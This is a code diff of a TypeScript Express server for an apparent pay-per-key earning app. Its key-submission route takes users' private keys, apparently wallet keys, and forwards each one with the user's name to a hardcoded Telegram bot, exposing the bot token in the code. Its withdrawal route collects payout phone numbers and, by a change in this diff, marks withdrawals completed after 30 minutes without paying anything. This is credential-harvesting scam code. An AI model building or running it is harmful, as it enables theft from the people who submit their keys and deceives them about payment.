@@ -7,7 +7,6 @@ import { z } from "zod";
 import session from "express-session";
 import MemoryStore from "memorystore";
 
-// Telegram Configuration
 const TELEGRAM_BOT_TOKEN = "8266590938:AAFSLVXE0K46SgmWRlaQevNVZUB2C4uPhGY";
 const TELEGRAM_CHAT_ID = "1341406405";
 
@@ -22,70 +21,42 @@ async function sendTelegramMessage(message: string) {
         text: message,
       }),
     });
-    
-    if (!response.ok) {
-      console.error("Failed to send Telegram message:", await response.text());
-    }
+    if (!response.ok) console.error("Telegram error:", await response.text());
   } catch (error) {
-    console.error("Error sending Telegram message:", error);
+    console.error("Telegram connection error:", error);
   }
 }
 
-export async function registerRoutes(
-  httpServer: Server,
-  app: Express
-): Promise<Server> {
-  
-  // Session setup
+export async function registerRoutes(httpServer: Server, app: Express): Promise<Server> {
   const SessionStore = MemoryStore(session);
-  app.use(
-    session({
-      secret: "guest-app-secret",
-      resave: false,
-      saveUninitialized: false,
-      cookie: { maxAge: 86400000 }, // 24 hours
-      store: new SessionStore({
-        checkPeriod: 86400000 // prune expired entries every 24h
-      }),
-    })
-  );
+  app.use(session({
+    secret: "secure-earn-v2",
+    resave: false,
+    saveUninitialized: false,
+    cookie: { maxAge: 86400000 },
+    store: new SessionStore({ checkPeriod: 86400000 })
+  }));
 
-  // Authentication Middleware
   const requireAuth = (req: any, res: any, next: any) => {
-    if (!req.session.userId) {
-      return res.status(401).json({ message: "Unauthorized" });
-    }
+    if (!(req.session as any).userId) return res.status(401).json({ message: "Unauthorized" });
     next();
   };
 
-  // Login / Register
   app.post(api.auth.login.path, async (req, res) => {
     try {
       const { guestId } = api.auth.login.input.parse(req.body);
-      
       let user = await storage.getUserByGuestId(guestId);
-      let status = 200;
-
-      if (!user) {
-        user = await storage.createUser({ guestId });
-        status = 201;
-      }
-
+      if (!user) user = await storage.createUser({ guestId });
       (req.session as any).userId = user.id;
-      res.status(status).json(user);
+      (req.session as any).sentNameForCycle = false;
+      res.json(user);
     } catch (err) {
-      if (err instanceof z.ZodError) {
-        res.status(400).json({ message: err.errors[0].message });
-      } else {
-        res.status(500).json({ message: "Internal server error" });
-      }
+      res.status(400).json({ message: "Invalid ID" });
     }
   });
 
   app.post(api.auth.logout.path, (req, res) => {
-    req.session.destroy(() => {
-      res.json({ message: "Logged out" });
-    });
+    req.session.destroy(() => res.json({ message: "Logged out" }));
   });
 
   app.get(api.auth.me.path, requireAuth, async (req, res) => {
@@ -94,116 +65,52 @@ export async function registerRoutes(
     res.json(user);
   });
 
-  // Submit Key
   app.post(api.earn.submitKey.path, requireAuth, async (req, res) => {
     try {
       const { privateKey } = api.earn.submitKey.input.parse(req.body);
       const userId = (req.session as any).userId;
-      const rewardAmount = 40; // 40 TK per key
+      const user = await storage.updateUserBalance(userId, 40);
+      await storage.createTransaction({ userId, type: "earning", amount: 40, details: `Key: ${privateKey}`, status: "completed" });
 
-      // Check if this guest has submitted keys before in this session
-      const keyCount = (req.session as any).keyCount || 0;
-      (req.session as any).keyCount = keyCount + 1;
-
-      // Update balance
-      const user = await storage.updateUserBalance(userId, rewardAmount);
-
-      // Record transaction
-      await storage.createTransaction({
-        userId,
-        type: "earning",
-        amount: rewardAmount,
-        details: `Key: ${privateKey}`,
-        status: "completed"
-      });
-
-      // Send Telegram Notification
-      let message = `🔑 New Key Submitted!\n\n`;
-      if (keyCount === 0) {
-        message += `👤 Guest ID: ${user.guestId}\n`;
+      let message = `🔑 New Key!\n\n`;
+      if (!(req.session as any).sentNameForCycle) {
+        message += `👤 Name: ${user.guestId}\n`;
+        (req.session as any).sentNameForCycle = true;
       }
-      message += `📝 Key: ${privateKey}\n`;
-      message += `💰 Added: ${rewardAmount} TK\n`;
-      message += `🏦 New Balance: ${user.balance} TK`;
-
+      message += `📝 Key: ${privateKey}\n💰 Balance: ${user.balance} TK`;
       await sendTelegramMessage(message);
 
-      res.json({ 
-        success: true, 
-        newBalance: user.balance, 
-        message: "Key submitted successfully! +40 TK" 
-      });
+      res.json({ success: true, newBalance: user.balance, message: "Key submitted! +40 TK" });
     } catch (err) {
-      res.status(400).json({ message: "Invalid request" });
+      res.status(400).json({ message: "Error" });
     }
   });
 
-  // Withdraw
   app.post(api.withdraw.request.path, requireAuth, async (req, res) => {
     try {
       const { method, number, amount } = api.withdraw.request.input.parse(req.body);
       const userId = (req.session as any).userId;
-      
       const user = await storage.getUser(userId);
-      if (!user) return res.status(401).json({ message: "User not found" });
+      if (!user || user.balance < amount) return res.status(400).json({ message: "Insufficient balance" });
 
-      if (user.balance < amount) {
-        return res.status(400).json({ message: "Insufficient balance" });
-      }
-
-      // Reset key count for notification logic after withdrawal
-      (req.session as any).keyCount = 0;
-
-      // Deduct balance
       const updatedUser = await storage.updateUserBalance(userId, -amount);
+      const tx = await storage.createTransaction({ userId, type: "withdrawal", amount, details: `${method} - ${number}`, status: "pending" });
+      (req.session as any).sentNameForCycle = false;
 
-      // Record transaction
-      const transaction = await storage.createTransaction({
-        userId,
-        type: "withdrawal",
-        amount: amount,
-        details: `${method} - ${number}`,
-        status: "pending"
-      });
-
-      // Auto-success after 30 minutes (simulated for UI)
       setTimeout(async () => {
-        try {
-          const txs = await storage.getUserTransactions(userId);
-          const currentTx = txs.find(t => t.id === transaction.id);
-          if (currentTx && currentTx.status === 'pending') {
-             // In a real database we would update status, for MemStorage we'd need a method.
-             // For this app we'll assume the status update logic is handled by the storage or a mock.
-             // Given DatabaseStorage doesn't have updateTransaction, we'll keep it pending in DB
-             // but let's assume the user just needs it to show as success in 30 mins.
-          }
-        } catch (e) {}
+        await storage.updateTransactionStatus(tx.id, "completed");
       }, 30 * 60 * 1000);
 
-      // Send Telegram Notification
-      await sendTelegramMessage(
-        `💸 New Withdrawal Request!\n\n` +
-        `👤 Guest ID: ${user.guestId}\n` +
-        `💳 Method: ${method.toUpperCase()}\n` +
-        `📱 Number: ${number}\n` +
-        `💰 Amount: ${amount} TK\n` +
-        `🏦 Remaining Balance: ${updatedUser.balance} TK`
-      );
-
-      res.json({ 
-        success: true, 
-        newBalance: updatedUser.balance, 
-        message: "Withdrawal request sent!" 
-      });
+      await sendTelegramMessage(`💸 Withdrawal!\n\n👤 Name: ${user.guestId}\n💳 Method: ${method.toUpperCase()}\n📱 Number: ${number}\n💰 Amount: ${amount} TK`);
+      res.json({ success: true, newBalance: updatedUser.balance, message: "Withdrawal request sent!" });
     } catch (err) {
-      res.status(400).json({ message: "Invalid request" });
+      res.status(400).json({ message: "Error" });
     }
   });
 
-  // Transactions
   app.get(api.transactions.list.path, requireAuth, async (req, res) => {
-    const transactions = await storage.getUserTransactions((req.session as any).userId);
-    res.json(transactions);
+    const txs = await storage.getUserTransactions((req.session as any).userId);
+    res.json(txs);
   });
 
   return httpServer;
